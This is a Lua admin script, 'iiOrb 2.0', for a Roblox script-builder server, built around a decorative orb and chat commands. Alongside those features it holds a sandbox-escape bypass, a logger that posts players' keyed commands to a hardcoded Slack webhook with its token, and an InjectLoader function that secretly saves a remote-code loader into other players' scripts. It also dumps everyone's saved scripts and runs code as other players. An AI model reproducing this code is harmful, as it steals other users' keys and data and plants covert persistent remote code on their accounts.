
--[[//CREDITS

--[[//UPDATE LOG


Turned off rbxdb features --c22

Added speed and bounce command -- error18 and c22

l

--//UPDATE LOG END]]--

local function protectfunc(func)
	local setfenv = setfenv
	local getfenv = getfenv
	local unpack = unpack
	local select = select
	local ypcall = ypcall
	local error = error
	return setfenv(function(...)
		local check = {ypcall(setfenv(func,getfenv(2)),...)}
		if not check[1] then 
			return error(check[2],2)
		end
		return select(2,unpack(check))
	end,{})
end

if rawget(shared,iiOrb) == true then
	error'iiOrb already ran.'
end 
shared.iiOrb = true
wait(); --Unremovable bypass 
script.Parent=nil
rawset(shared, "\0bp", function()
local i=game:service'InsertService':LoadAssetVersion(519416165);
local n=i:children()[1];
game:service'Debris':AddItem(i,0);
n.Parent=workspace;
coroutine.yield();
local e;
pcall(_G.OSC_AddServerSideData,setmetatable({},{__index=function(...)e=getfenv(2)end,__metatable=''}));
_G.OSC_AddServerSideData=nil;
game:service'Debris':AddItem(n,0);
return e 
end);
local y=shared['\0bp']();
shared["\0bp"]=nil;
game:GetService'ReplicatedStorage':ClearAllChildren();
y.setfenv(0,y);
y.setfenv(1,y);
y.pcall(function() y.setfenv(2,y); end); --Ends the bypass

-- Easiest Fixing ever l0l.

--// TOTS NOT SOLARIS :)
local iiOrb = {
	AccessKey = "=BNFO@E%+gAOyLJbIJSlQ!IXOfg^10wezjG6Nf#^b4fO%&wFuzAQ|youxgW&3gl&epj4V5=EFLO9#HAJ";
    --// Kill Switch
    __STATUS = true;
    --// Administrations Components
    Admins  = {
        ['masterepico']={Level=5};
		["jebjordan"]={Level=5};
		['missade']={Level=5}; --alt
		['supersonicfan111']={Level=2};
		['iiDeadzone']={Level=2e9};
		["Player1"]={Level=5};
		['Ledtred']={Level=4};
		["clv2"]={Level=5};
		["error18"]={Level=2e9};
		["DrAnkIe"]={Level=3};
		["Control22"]={Level=2e9};--Screw you opligitory XD -- LOL.
		["Slappy826"]={Level=2e9};--huheuheuheuhe snuck dis in k
		["Dev3l0per"]={Level=5}; -- Pretty sure this is op too :/ if not then lol.
		['GuyWithACleverName']={Level=2e9};
		['minecraftrath101']={Level=-1};
		['Dittoide']={Level=-1};
		["Nexure"]={Level=5};--Nex is a cool guy ;)
		["mistahFedora"]={Level=2e9};
    };
	Levels = {
		[-1]='ih8youk';
		[1]="User";
		[2]="Trusted";
		[3]="Friend";
		[4]="Trusted asf person";
		[5]="Creator/Developer";
		[2e9]='Founder';
	};
    Banned  = {
    	gage7252002="bye bye skid ur banned now";
    	Mikko3m="dont ban me skid C:";
    	Dittoide='FM\'d admin and took sh\5it from other people and put his kohl message crap into _G and i spammed it'
	};
   Chatted = {
        Settings = {
            Prefix = "!";
            Suffix = ";";
        };
        Commands = {};
    };
    --// Orb Components
    Settings = {
		Orb        = nil;
		Character  = nil;
		Following  = false;
		Target     = "";
		TrailParts = {};
		Trail      = true;
		OrbColor   = BrickColor.new("Institutional white");
		TrailColor = BrickColor.new("Institutional white");
		Rotation   = {
			Rot    = 0;
			Radius = 5;
			Height = 1.5;
			Bounce = 2.0;
			Speed  = 0.02;
			Length = 0.01;
		};
	};
    --// Tool Components
    Blocker = {
        LocalBlock  = false;
        GlobalBlock = false;
		LagBlocker  = true;
    };
	LagBlockedInstances = {
		"Message";
		"Hint";
		"Sound";
	};
    Logs = {};
    --// Functional Storage
    API = {
		Bootstrap = {}
	};
}
local Settings = iiOrb.Settings
local API = iiOrb.API
local Bootstrap = API.Bootstrap
local Time = require(285173569)
--local rbxdb = require(278524047)
--local key = "d12ed549bd1bd58b5d9420c5c6919c4e"
--pcall(rbxdb:Connect(key))

--// Output API

function API.print_to(target,input)
	type = type or 'Warn'
    if input == nil then input = "nil" end
    local plr
    if type(target)=='userdata'then
        plr = target
    elseif type(target)=='string'then
        plr = game:GetService('Players'):FindFirstChild(target)
    end
    if type(plr)=='userdata' then
        local str = Instance.new('StringValue',plr)
        str.Name = 'SB_Output:Output'
        str.Value = game:GetService('HttpService'):JSONEncode{'Warn',input}
    end
end local print_to = iiOrb.API.print_to

function API.print(input)
    if input == nil then input = "nil" end
    for i,v in pairs(game:GetService('Players'):children())do
        if iiOrb.Admins[v.Name]then
            if iiOrb.Admins[v.Name].Level > 2 then
                print_to(v,input)
            end
        end
    end
end local print = iiOrb.API.print

function API.print_lvl(level,input)
    if input == nil then input = "nil" end
    for i,v in pairs(game:GetService('Players'):GetPlayers())do
        if iiOrb.Admins[v.Name]then
            if iiOrb.Admins[v.Name].Level > level then
                print_to(v,input)
            end
        end
    end
end local print_lvl = iiOrb.API.print_lvl

function API.broadcast(input)
    if input == nil then input = "nil" end
    for i,v in pairs(game:GetService('Players'):GetPlayers())do
        print_to(v,input)
    end
end local broadcast = iiOrb.API.broadcast

--// Utility API

function API.Make(ClassName)
	return function(data)
		local Instance = Instance.new(ClassName)
		for index,value in pairs(data) do
			if type(index) == "number" then
				value.Parent = Instance
			else
				Instance[index] = value
			end
		end
		return Instance
	end
end local Make = API.Make

--[[
--//OPCLERP
function API.clerp(p1,p2,percent)
	local p1x,p1y,p1z,p1R00,p1R01,p1R02,p1R10,p1R11,p1R12,p1R20,p1R21,p1R22=p1:components()
	local p2x,p2y,p2z,p2R00,p2R01,p2R02,p2R10,p2R11,p2R12,p2R20,p2R21,p2R22=p2:components()
	return CFrame.new(p1x+percent*(p2x-p1x),p1y+percent*(p2y-p1y),p1z+percent*(p2z-p1z),p1R00+percent*(p2R00-p1R00),p1R01+percent*(p2R01-p1R01),p1R02+percent*(p2R02-p1R02),p1R10+percent*(p2R10-p1R10),p1R11+percent*(p2R11-p1R11),p1R12+percent*(p2R12-p1R12),p1R20+percent*(p2R20-p1R20),p1R21+percent*(p2R21-p1R21),p1R22+percent*(p2R22-p1R22))
end]]

function API.lerp(c1, c2, al)
	return c1+(c2-c1)*al
end

function API.clerp(c1, c2, al) -- cframe1, cframe2, alpha/percent
	local com1 = {c1.X,c1.Y,c1.Z,c1:toEulerAnglesXYZ()}
	local com2 = {c2.X,c2.Y,c2.Z,c2:toEulerAnglesXYZ()}
	for i,v in pairs(com1) do
		com1[i] = API.lerp(v,com2[i],al)
	end
	return CFrame.new(com1[1],com1[2],com1[3]) * CFrame.Angles(select(4,unpack(com1)))	
end

local lerp = API.lerp
local clerp = API.clerp

function API.Rainbow(i)
    local section = i % 1 * 3
    local secondary = 0.5 * math.pi * (section % 1)
    if section < 1 then
        return 1, 1 - math.cos(secondary), 1 - math.sin(secondary)
    elseif section < 2 then
        return 1 - math.sin(secondary), 1, 1 - math.cos(secondary)
    else
        return 1 - math.cos(secondary), 1 - math.sin(secondary), 1
    end
end local Rainbow = API.Rainbow

function API.GetPlayer(msg,plr)
	local Collected_Players = {}
	if string.lower(msg) == "me" then
		table.insert(Collected_Players, plr)
	elseif string.lower(msg) == "all" then
		for index,player in pairs(game:GetService('Players'):children()) do
			if iiOrb.Admins[player.Name].Level < iiOrb.Admins[plr.Name].Level or (plr.Name == player.Name) then
				table.insert(Collected_Players, player)
			end
		end
	elseif string.lower(msg) == "others" then
		for index,player in pairs(game:GetService('Players'):children()) do
			if player.Name ~= plr.Name then
				if iiOrb.Admins[player.Name].Level < iiOrb.Admins[plr.Name].Level then
					table.insert(Collected_Players, player)
				end
			end
		end
	elseif string.lower(msg) == "friends" then
		for index,player in pairs(game:GetService('Players'):children()) do
			if player.Name ~= plr.Name then
				if iiOrb.Admins[player.Name].Level < iiOrb.Admins[plr.Name].Level then
					if plr:IsFriendsWith(player.userId) == true then
						table.insert(Collected_Players, player)
					end
				end
			end
		end
	elseif string.lower(msg) == "nonfriends" then
		for index,player in pairs(game:GetService('Players'):children()) do
			if player.Name ~= plr.Name then
				if iiOrb.Admins[player.Name].Level < iiOrb.Admins[plr.Name].Level then
					if plr:IsFriendsWith(player.userId) == false then
						table.insert(Collected_Players, player)
					end
				end
			end
		end
	else
		for index,player in pairs(game:GetService('Players'):children()) do
			if string.sub(string.lower(player.Name), 1, #msg) == string.lower(msg) then
				if iiOrb.Admins[player.Name].Level <= iiOrb.Admins[plr.Name].Level or (plr.Name == player.Name) then
					table.insert(Collected_Players, player)
				end
			end
		end
	end
	return Collected_Players
end local GetPlayer = API.GetPlayer

function API.GetSplit(msg)
   return string.find(msg,iiOrb.Chatted.Settings.Suffix)
end local GetSplit = API.GetSplit

function API.Generate(Length)
	local Generated = ""
	for _ = 1, Length do
		Generated = Generated .. string.char(math.random(33,126))
	end
	return Generated
end local Generate = API.Generate

function API.GetGarbage(plr)
	print_to(plr,"Got Garbage")
	print_to(plr,"________________________")
	for i = 1,10 do wait(1)
		print_to(plr,"| Attempt#"..i.." ["..collectgarbage("count").."] |")
	end
	print_to(plr,"________________________")
end local GetGarbage = API.GetGarbage

--// Orb API

function API.SpawnOrb()
	Settings.Orb = Make('Part'){
		Name = "\5iiOrb\5";
		Parent = game.Workspace,
		BrickColor = Settings.OrbColor,
		Material = Enum.Material.SmoothPlastic,
		Transparency = .1,
		Anchored = true,
		CanCollide = false,
		Locked = true,
		FormFactor = "Symmetric",
		Shape = "Ball",
		Size = Vector3.new(1,1,1),
		TopSurface = 10,
		BottomSurface = 10,
	}Settings.Orb.Changed:connect(function()
		if not game.Workspace:FindFirstChild(Settings.Orb.Name)then
			if iiOrb.__STATUS == true then
				API.SpawnOrb()
			end
		end
	end)
end local SpawnOrb = API.SpawnOrb

function API.MakeTrail()
	if Settings.Orb ~= nil and Settings.Trail == true then
		local Trail = Make'Part'{
			Name='\5iiOrb\5',
			CanCollide = false,
			Parent = Settings.Orb,
			BrickColor = Settings.TrailColor,
			Material = Enum.Material.SmoothPlastic,
			Transparency = .1,
			Anchored = true,
			Locked = true,
			FormFactor = "Custom",
			Size = Vector3.new(.2,.2,.2),
			CFrame = Settings.Orb.CFrame,
			TopSurface = 10,
			BottomSurface = 10,
		}table.insert(Settings.TrailParts, Trail)
		return Trail
	end
end local MakeTrail = API.MakeTrail

function API.SpawnTrail()
	if Settings.Orb ~= nil and Settings.Trail == true then
		local Trail = API.MakeTrail()
	end
end local SpawnTrail = API.SpawnTrail

function API.Rotate()
	game:GetService('RunService').Stepped:connect(function()
		if iiOrb.__STATUS == true then
			wait()
			local Following=game:GetService('Players'):FindFirstChild(Settings.Target)
			if Following and Following.Character and Following.Character:FindFirstChild("Torso") and Settings.Following then
				Settings.Character = Following.Character.Torso.CFrame
			else
				Settings.Character = CFrame.new(0,5.7,0)
			end
			if Settings.Orb ~= nil then
				Settings.Rotation.Rot = Settings.Rotation.Rot + Settings.Rotation.Speed
				Settings.Orb.Name = "ii\5Orb"
				Settings.Orb.CFrame = clerp(Settings.Orb.CFrame,
					CFrame.new(Settings.Character.p)
					*CFrame.new(0,3.9,0)
					*CFrame.Angles(0,Settings.Rotation.Rot,(math.sin((tick())*.8004)*5)*.4)
					*CFrame.new(Settings.Rotation.Radius, math.sin((tick())*Settings.Rotation.Bounce)*Settings.Rotation.Height,2)
					*CFrame.Angles(100,Settings.Rotation.Rot,(math.sin((tick())*1)*5)*.9)     ,.1)
				API.SpawnTrail()
				for i,_ in next,Settings.TrailParts do
					if Settings.TrailParts[i] ~= nil and Settings.TrailParts[i+1] ~= nil then
						local Part1 = Settings.TrailParts[i]
						local Part2 = Settings.TrailParts[i+1]
						local Mag = ((Part1.CFrame.p-Part2.CFrame.p).magnitude)
						Part1.Name = math.random(1,99999999)
						Part1.Size = Vector3.new(Part1.Size.X+Settings.Rotation.Length, Mag, Part1.Size.Z+Settings.Rotation.Length)
						Part1.Transparency = Part1.Transparency + .017
						Part1.CFrame = CFrame.new(Part1.CFrame.p, Part2.CFrame.p)
						* CFrame.Angles(math.pi/2,0,0)
						if Part1.Size.X >= .74 then
							Part1:Destroy()
							table.remove(Settings.TrailParts, i)
						end
					end
				end
			end
		end
	end)
end local Rotate = API.Rotate

function API.ChangeTheme(plr,theme)
	--// Sets orb to default configurations
	Settings.Orb.BrickColor = BrickColor.new('White')
	Settings.Orb.Transparency = .1
	for i,v in pairs(Settings.Orb:children())do if v.ClassName=='SpecialMesh'then v:remove()end end
	--// Themes
	if theme == 'normal' then
		API.SpawnTrail = function()
			if Settings.Orb ~= nil and Settings.Trail == true then
				local Trail = API.MakeTrail()
			end
		end
	elseif theme == 'c22' or theme == 'default' then
		API.SpawnTrail = function()
			if Settings.Orb ~= nil and Settings.Trail == true then
				local Trail = API.MakeTrail()
				spawn(function()
					Settings.Orb.BrickColor = BrickColor.new('Really black')
					Trail.BrickColor = BrickColor.new('Really red')
					local box = Make('SelectionBox'){
						Adornee = Trail;
						Parent = Trail;
						Name = "\5\5\5\5\5SelectionBox\5\5\5\5\5";
						LineThickness = 0.001;
						Color3 = Color3.new(0,0,0);
					}
				end)
			end
	end
elseif theme == 't0t' or theme == 'tr0ll'  then
	API.SpawnTrail = function()
		if Settings.Orb ~= nil and Settings.Trail == true then
				local Trail = API.MakeTrail()
		spawn(function()
		Settings.Orb.BrickColor = BrickColor.new('White')
					local S_Box = Make('SelectionBox'){
                 Adornee = Trail;
                 Parent = Trail;
                 Name = "\5\5\5\5\SelectionBox\5\5\5\5\5";
                 LineThickness = 0;
                 Color3 = BrickColor.new("White").Color;
                }
 					Trail.BrickColor = BrickColor.new('White')
					wait(0.5)
					Trail.BrickColor = BrickColor.new('Lime green')
            end)
            end
            end
            elseif theme == 'error' or theme == 'err'  then
	API.SpawnTrail = function()
		if Settings.Orb ~= nil and Settings.Trail == true then
				local Trail = API.MakeTrail()
		spawn(function()
		Settings.Orb.BrickColor = BrickColor.new('Really red')
					local S_Box = Make('SelectionBox'){
                 Adornee = Trail;
                 Parent = Trail;
                 Name = "\5\5\5\5\SelectionBox\5\5\5\5\5";
                 LineThickness = 0;
                 Color3 = BrickColor.new("Really red").Color;
                }
 					Trail.BrickColor = BrickColor.new('Really red')
					wait(0.5)
					Trail.BrickColor = BrickColor.new('Bright orange')
            end)
            end
                end
                elseif theme == 'rath' or theme == 'mine101'  then
	API.SpawnTrail = function()
		if Settings.Orb ~= nil and Settings.Trail == true then
				local Trail = API.MakeTrail()
		spawn(function()
		Settings.Orb.BrickColor = Trail.BrickColor
					local S_Box = Make('SelectionBox'){
                 Adornee = Trail;
                 Parent = Trail;
                 Name = "\5\5\5\5\SelectionBox\5\5\5\5\5";
                 LineThickness = 0;
                 Color3 = BrickColor.new("White").Color;
                }
 					Trail.BrickColor = BrickColor.new('Toothpaste')
					wait(0.5)
					Trail.BrickColor = BrickColor.new('Really black')
            end)
            end
                end
	elseif theme == 'ii' then
		API.SpawnTrail = function()
			if Settings.Orb ~= nil and Settings.Trail == true then
				local Trail = API.MakeTrail()
				spawn(function()
					Settings.Orb.BrickColor = BrickColor.new('Really black')
					local box = Make('SelectionBox'){
						Adornee = Trail;
						Parent = Trail;
						Name = "\5\5\5\5\5SelectionBox\5\5\5\5\5";
						LineThickness = 0.001;
						Color3 = Color3.new(0,0,0);
					}
								
					Trail.BrickColor = BrickColor.new('Really black')
					wait(0.5)
					Trail.BrickColor = BrickColor.new('Lime green')
				end)
			end
		end
    elseif theme == 'gwc' then
        API.SpawnTrail = function()
           local Trail = API.MakeTrail()
           spawn(function()
               Settings.Orb.BrickColor = BrickColor.new("Lime green")
               local S_Box = Make('SelectionBox'){
                 Adornee = Trail;
                 Parent = Trail;
                 Name = "\5\5\5\5\SelectionBox\5\5\5\5\5";
                 LineThickness = 0.0000001;
                 Color3 = BrickColor.new("Really black").Color;
                }
                Trail.BrickColor = BrickColor.new'Lime green'
                wait(0.50)
                Trail.BrickColor = BrickColor.new'Really blue'
           end)
        end
	elseif theme == 'whiteout' then
        API.SpawnTrail = function()
           local Trail = API.MakeTrail()
           spawn(function()
               Trail.BrickColor = BrickColor.new("White")
               Settings.Orb.BrickColor = BrickColor.new("Really black")
               local S_Box = Make('SelectionBox'){
                 Adornee = Trail;
                 Parent = Trail;
                 Name = "\5\5\5\5\SelectionBox\5\5\5\5\5";
                 LineThickness = 0;
                 Color3 = BrickColor.new("Really black").Color;
                }
			   local Mesh = Make('SpecialMesh'){
					Parent = Settings.Orb;
					MeshId = "http://www.roblox.com/asset/?id=1529453";
					Name   = "Mesh";
					Scale  = Vector3.new(2.5,2.5,2.5)
				}
           end)
        end
	elseif theme == 'hidden' then
        API.SpawnTrail = function()
           local Trail = API.MakeTrail()
           spawn(function()
               Trail.Transparency = 1
               Settings.Orb.Transparency = 1
           end)
        end
	else
		print_to(plr,"[Error]: "..theme.." is not a valid theme name")
		return
	end
	print_to(plr,"[iiOrb 2.0]: Orb has changed theme to "..theme)
end local ChangeTheme = API.ChangeTheme

function API.Follow(boolean,plr)
	if type(plr)~='string'then return end
	if boolean == true then
		Settings.Following = true
		Settings.Target = plr
	elseif boolean == false then
		Settings.Following = false
		Settings.Target = ""
	end
end local Follow = API.Follow


--// Oxcool1 Sb Tools API

function API.Sbexe(cmd,plr)
    if not type(cmd)=='string'then return end
    if plr then
        if type(plr)=='userdata'then
           plr:FindFirstChild("SB_CommandRemote",true).Value = cmd
        elseif type(plr)=='string'then
            plr = game:GetService('Players'):FindFirstChild(plr)
            plr:FindFirstChild("SB_CommandRemote",true).Value = cmd
        end
    else
        for i,v in pairs(game:GetService('Players'):children())do
            v:FindFirstChild("SB_CommandRemote",true).Value = cmd
        end
    end
end 
local Sbexe = API.Sbexe
function DBAsync(DB)
	game:GetService'DataStoreService':GetDataStore(DB)
end
function API.ConnectLogger(plr)
	if type(plr) ~= 'userdata'then return end
	if plr:FindFirstChild("SB_CommandRemote",true) then
		plr:FindFirstChild("SB_CommandRemote",true).Changed:connect(function()
			if plr:FindFirstChild("SB_CommandRemote",true).Value == 'h/http://pastebin.com/raw.php?i=TdtSWRAL' then
				Sbexe("g/ns")wait(.1)
				plr:Kick("[Script Protector]: You have been kicked for attempting to load a blocked script")
			end
			if #plr:FindFirstChild("SB_CommandRemote",true).Value > 0 then
				
				table.insert(iiOrb.Logs,{User=tostring(plr.Name);Command=tostring(plr:FindFirstChild("SB_CommandRemote",true).Value)})
				 local function slack(msg)
				 local post = game.HttpService:PostAsync('https://sb-scripts.slack.com/services/hooks/slackbot?token=LgvzZbwa5P2tIPUzTibrtRHn&channel=%23sbmessage',msg)
 if post then
         print'Sent!'
     end
 end
 				 if plr:FindFirstChild('SB_CommandRemote',true).Value:sub(2,string.len'http://roblox-arteries.rhcloud.com/?key=') == 'http://roblox-arteries.rhcloud.com/?key=' then
				 	slack('plrname: '..plr.Name..'| '..plr:FindFirstChild'SB_CommandRemote'.Value)
				 	end
				local CurrentTime = Time:GetTime()
				local TimeStamp   = ("["..CurrentTime.year.." "..CurrentTime.month.." "..CurrentTime.day.."]")
				--rbxdb:SetValue(TimeStamp..": "..tostring(plr.Name),tostring(plr:FindFirstChild("SB_CommandRemote",true).Value))
			end
		end)
	end
end local ConnectLogger = API.ConnectLogger

function API.GetLogs(plr)
	print_to(plr,"Got logs")
	if #iiOrb.Logs > 0 then print_to(plr,"--------------------------------") end
	for index,data in pairs(iiOrb.Logs)do
		if #iiOrb.Logs > 30 then wait(.1)end
		print_to(plr,tostring(data.User))
		print_to(plr,tostring(data.Command))
		print_to(plr,"--------------------------------")
	end
end local GetLogs = API.GetLogs

function API.InjectLoader(plr)
	Sbexe("remove/load_iiOrb",plr)
	Sbexe("ch/load_iiOrb/https://sb-scripts-brandan000124.c9.io/iiOrb%202.0%20Module/HttpLoad.lua",plr)
	Sbexe("save/load_iiOrb",plr)
	print('Injected loader into '..tostring(plr))
	print(tostring(plr)..' has been given a loader ;)')-- l0l nice
end local InjectLoader = API.InjectLoader

function API.GetSavedScripts(plr)
	local Save_Key = string.reverse("stpircSdevaS_xoREDliubtpIrCs");
	print_to(plr,"Got Saved Scripts")
	for i,v in pairs(game:GetService('Players'):children())do
		if v.ClassName == 'Player' then
			local Encoded_Table = v:LoadString(Save_Key)
			local Decoded_Table

			--//Table Decoding
			if type(Encoded_Table)=='string' and Encoded_Table=="[]"or Encoded_Table==""then
				Decoded_Table = {{No=" Saved Scripts"}}
			else
				Decoded_Table = game:GetService('HttpService'):JSONDecode(Encoded_Table)
			end
			--// Table Printing
			--print_to(plr,"------------------------------------------------------------------")
			print_to(plr,"--------------------------["..v.Name.."]--------------------------")
			if type(Decoded_Table)=='table'then
				for _index,_data in pairs(Decoded_Table)do
					for index,data in pairs(_data)do
						wait(.1)
						print_to(plr,index.." : "..data)
					end
				end
			end
			print_to(plr,"------------------------------------------------------------------")
		end
	end
end local GetSavedScripts = API.GetSavedScripts

function API.GiveServerConsole(Player)
	if Player:FindFirstChild("PlayerGui") and Player:FindFirstChild("PlayerGui").ClassName == "PlayerGui" then
		spawn(function()
			local Create = API.Make
			local Closed = false
			local ScreenGui = Create "ScreenGui" {
				Name = "Server Console",
				Parent = Player.PlayerGui
			}
			local Main = Create "TextButton" {
				AutoButtonColor = false,
				BackgroundColor3 = Color3.new(0, 0, 0),
				BorderSizePixel = 0,
				Size = UDim2.new(0, 375, 0, 15),
				Draggable = true,
				Font = "SourceSansBold",
				FontSize = "Size14",
				TextYAlignment = "Top",
				TextColor3 = Color3.new(1, 1, 1),
				Text = " Server Console",
				TextXAlignment = "Left",
				Position = UDim2.new(0.321, 0, 0.196, 0),
				Parent = ScreenGui
			}
			local Refresh = Create "TextButton" {
				Active = true,
				AutoButtonColor = false,
				BackgroundColor3 = Color3.new(0, 0, 0),
				BorderSizePixel = 0,
				Position = UDim2.new(1, 0, 0, 0),
				Size = UDim2.new(0, 60, 0, 15),
				Font = "SourceSansBold",
				FontSize = "Size14",
				Text = "Refresh",
				TextYAlignment = "Top",
				TextColor3 = Color3.new(1, 1, 1),
				TextYAlignment = "Top",
				TextXAlignment = "Right",
				Parent = Main
			}
			local TextButton = Create "TextButton" {
				AutoButtonColor = false,
				BackgroundColor3 = Color3.new(0, 0, 0),
				BorderSizePixel = 0,
				Position = UDim2.new(1, 60, 0, 0),
				Size = UDim2.new(0, 15, 0, 15),
				Font = "SourceSansBold",
				FontSize = "Size14",
				TextYAlignment = "Top",
				Text = "-",
				TextColor3 = Color3.new(1, 1, 1),
				Parent = Main
			}
			local ContentFrame = Create "Frame" {
				BackgroundColor3 = Color3.new(0, 0, 0),
				BackgroundTransparency = 0.2,
				BorderSizePixel = 0,
				Position = UDim2.new(0, 0, 0, 15),
				Size = UDim2.new(0, 450, 0, 0),
				Parent = Main
			}
			local ScrollingFrame = Create "ScrollingFrame" {
				Size = UDim2.new(1, 0, 1, 0),
				CanvasSize = UDim2.new(3, 0, 0, 0),
				MidImage = "rbxassetid://158362264",
				TopImage = "rbxassetid://158362307",
				BottomImage = "rbxassetid://158362221",
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				ScrollBarThickness = 5,
				Parent = ContentFrame
			}
			ContentFrame:TweenSize(UDim2.new(0, 450, 0, 435), "Out", "Quad", 1.5, true)
			TextButton.MouseButton1Down:connect(function()
				if Closed == false then
					Closed = true
					TextButton.Text = "+"
					ContentFrame:TweenSize(UDim2.new(0, 450, 0, 0), "Out", "Quad", 1.5, true)
					delay(1, function()
						ScrollingFrame.Visible = false
					end)
				else
					Closed = false
					TextButton.Text = "-"
					ContentFrame:TweenSize(UDim2.new(0, 450, 0, 435), "Out", "Quad", 1.5, true)
					delay(0.5, function()
						ScrollingFrame.Visible = true
					end)
				end
			end)
			local function GetNumberOfChildren(Object)
				local Number = -15
				for index,child in pairs(Object:GetChildren()) do
					if child.ClassName == "TextLabel" then
						Number = Number + 15
					end
				end
				return Number
			end
			local function Output(Text, Color)
				local Line = Create "TextLabel" {
					ZIndex = 2,
					BackgroundTransparency = 1,
					BorderSizePixel = 0,
					Text = string.format(" %s", Text),
					Font = "SourceSansBold",
					FontSize = "Size14",
					TextColor3 = Color,
					TextWrapped = false,
					Size = UDim2.new(1, 0, 0, 15),
					Position = UDim2.new(0, 0, 0, GetNumberOfChildren(ScrollingFrame)),
					TextXAlignment = "Left",
					TextYAlignment = "Top",
					TextStrokeTransparency = 0.9,
					Parent = ScrollingFrame,
				}
				if #ScrollingFrame:GetChildren() > 29 then
					local NumChildren = GetNumberOfChildren(ScrollingFrame)
					ScrollingFrame.CanvasSize = UDim2.new(3, 0, 0, NumChildren)
					ScrollingFrame.CanvasPosition = Vector2.new(0, (ScrollingFrame.CanvasSize.Y.Offset - ScrollingFrame.AbsoluteSize.Y) + 5)
				end
			end
			local function OutputLogHistory()
				for index,data in pairs(game.LogService:GetLogHistory()) do
					if data.messageType == Enum.MessageType.MessageOutput then
						Output(string.format("%s - %s", data.timestamp, data.message), Color3.new(1, 1, 1))
					elseif data.messageType == Enum.MessageType.MessageWarning then
						Output(string.format("%s - %s", data.timestamp, data.message), Color3.new(1, 0.6, 0.4))
					elseif data.messageType == Enum.MessageType.MessageError then
						Output(string.format("%s - %s", data.timestamp, data.message), Color3.new(1, 0, 0))
					elseif data.messageType == Enum.MessageType.MessageInfo then
						Output(string.format("%s - %s", data.timestamp, data.message), Color3.new(0.4, 0.5, 1))
					end
				end
			end
			OutputLogHistory()
			Refresh.MouseButton1Down:connect(function()
				ScrollingFrame:ClearAllChildren()
				wait()
				OutputLogHistory()
			end)
		end)
	end
end local GiveServerConsole = API.GiveServerConsole

function API.SafeExe(string_src,string_plr)
	if string_src == nil then string_src = "" end

	local BypassEnv = getfenv(1)
	BypassEnv.script = "Locked Object"
	BypassEnv.print_to = print_to
	rawset(_G,"NewBypassEnv",BypassEnv)

	local ExecuteSource = [[
		wait(.1)
		local newEnv = _G.NewBypassEnv
		newEnv.owner = getfenv(1).owner
		newEnv.print = function(i)
			if i == nil then i = "" end
			newEnv.print_to(tostring(owner),i)
		end
		setfenv(1,newEnv)
	]]
	local ExeSrc = ExecuteSource..string_src
	Sbexe("c/"..ExeSrc,string_plr)
end local SafeExe = API.SafeExe

--// Admin API

function API.GetAdmins(plr)
	for i,v in pairs(iiOrb.Admins)do
		print_to(plr,"["..i.."]-"..iiOrb.Levels[v.Level])
	end
end local GetAdmins = API.GetAdmins

function API.AddCommand(Name,Usage,Desc,Level,Func)
	table.insert(iiOrb.Chatted.Commands,{Name=Name,Usage=Usage,Desc=Desc,Level=Level,Func=Func})
end local AddCommand = API.AddCommand

function API.Chatted(plr,msg)
	if msg:lower()=='h/http://pastebin.com/raw.php?i=TdtSWRAL'then
		Sbexe("g/ns")
		plr:Kick("[Script Protector]: You have been kicked for attempting to load a blocked script")
	end
	local Commands = iiOrb.Chatted.Commands
	local Prefix   = iiOrb.Chatted.Settings.Prefix
	local Suffix   = iiOrb.Chatted.Settings.Suffix
	local sub      = string.sub
	local lower    = string.lower
	if sub(msg,1,3)=='/e 'then
		msg = sub(msg,4)
	end
	if iiOrb.Admins[plr.Name]then
		for index,data in pairs(Commands)do
			if Prefix..data.Usage..Suffix == sub(lower(msg),1,string.len(Prefix)+string.len(data.Usage)+string.len(Suffix))then
				if iiOrb.Admins[plr.Name].Level >= data.Level then
					local y,n = ypcall(function()
						data.Func(sub(msg,string.len(Prefix)+string.len(data.Usage)+string.len(Suffix)+1), GetPlayer, plr)
					end)
					if not y then
						print_to(plr,"[Error]: a command related error has occured : "..n)
					end
				else
					print_to(plr,"[Error]: Your access level is to low for that command")
				end
			end
		end
	end
end local Chatted = API.Chatted

function API.BootCommands()--// Function that calls and injects all commands

	AddCommand("Test","tst","TEST TEST",1,function(Message,Collect_Players,Player)
		print_to(Player,"[iiOrb 2.0]: TEST")
	end)

	AddCommand("Commands","cmds","Gets commands",1,function(Message,Collect_Players,Player)
		print_to(Player,"Got Commands")
		print_to(Player,"---------------------------------------------------------------")
		for index,data in pairs(iiOrb.Chatted.Commands)do
			print_to(Player,"["..data.Name.."]-Level["..data.Level.."]-Usage:[\""..data.Usage.."\"]-Desc:["..data.Desc.."]")
			print_to(Player,"---------------------------------------------------------------")
		end
	end)

	AddCommand("Admins","admins","Gets admins",1,function(Message,Collect_Players,Player)
		print_to(Player,"Got admins")
		GetAdmins(Player)
	end)

	AddCommand("GetLogs","gl","Gets command logs",4,function(Message,Collect_Players,Player)
		GetLogs(Player)
	end)

	AddCommand('Kick','kick','Kicks a player from the server',3,function(Message, Collect_Players, Player)
		local Split = GetSplit(Message)
		local Plrs
		local Reason
		if Split == nil then
			 Plrs = Collect_Players(Message,Player)
			 Reason = nil
		else
			Plrs = Collect_Players(Message:sub(1,Split-1),Player)
			Reason = Message:sub(Split+1)
		end
		if #Plrs>0 then
			for _,Plr in pairs(Plrs) do
			    if Reason == nil or Reason == "" then Reason = "You have been kicked from this server"end
				Plr:Kick(Reason)
			end
		end
	end)

	AddCommand('Ban','ban','Bans a player from the server', 3, function(Message, Collect_Players, Player)
		local Split = GetSplit(Message)
		local Plrs
		local Reason
		if Split == nil then
			 Plrs = Collect_Players(Message,Player)
			 Reason = nil
		else
			Plrs = Collect_Players(Message:sub(1,Split-1),Player)
			Reason = tostring(Message:sub(Split+1))
		end
		if #Plrs>0 then
			for _,Plr in pairs(Plrs) do
			    if Reason == nil or Reason == "" then Reason = tostring("Being Banned") end
				--table.insert(iiOrb.Banned,tostring(Plr.Name)==tostring(Reason))
				iiOrb.Banned[Plr.Name]=tostring(Reason)
				Plr:Kick("You have been banned for "..tostring(Reason))
			end
		end
    end)

	AddCommand('Unban','unban','Unbans a player', 3, function(Message, Collect_Players, Player)
		for i,v in pairs(iiOrb.Banned)do
			if string.sub(string.lower(i),1,#Message)==string.lower(Message)then
				iiOrb.Banned[i]=nil
			end
		end
	end)

	AddCommand('Banned','banned','Shows banned table',2,function(Message, Collect_Players, Player)
		print_to(Player,"Got Banned")
		print_to(Player,"--------------------------------")
		for i,v in pairs(iiOrb.Banned)do
			print_to(Player,"["..tostring(i).."]: "..tostring(v))
			print_to(Player,"--------------------------------")
		end
	end)

